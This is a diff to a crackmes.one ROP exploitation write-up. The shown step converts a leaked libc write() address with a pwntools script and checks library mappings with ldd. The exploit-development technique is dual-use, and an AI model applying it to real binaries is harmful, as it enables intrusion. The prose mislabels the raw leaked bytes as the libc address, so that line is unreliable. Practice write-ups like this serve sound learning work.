@@ -274,5 +274,22 @@ For my leak script, I used gadget 2. This is the results:
 Leaked (8 bytes): e0ddd07f027f0000
 [*] Stopped process './rop' (pid 23912)
 ```
+Now that is the leaked value, but we need to translate that to a real usable address. For that I made another little script.
+```
+from pwn import *
+leaked = bytes.fromhex('e0ddd07f027f0000')
+write_libc = u64(leaked)
+print(hex(write_libc))
 
-Amazing! Our libc address is `0xe0ddd07f027f0000`! This, again, only works like this because the program has no PIE, and means these addresses are always the same. Otherwise, we'd have to do this all in a single runtime.
+~/Projects/RE/crackmes.one/rop
+❯ python translate_libc.py
+0x7f027fd0dde0
+```
+Amazing! Our libc address is `0xe0ddd07f027f0000`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
+```
+~/Projects/RE/crackmes.one/rop
+❯ ldd ./rop
+        linux-vdso.so.1 (0x00007f77bda05000)
+        libc.so.6 => /usr/lib/libc.so.6 (0x00007f77bd600000)
+        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f77bda07000)
+```
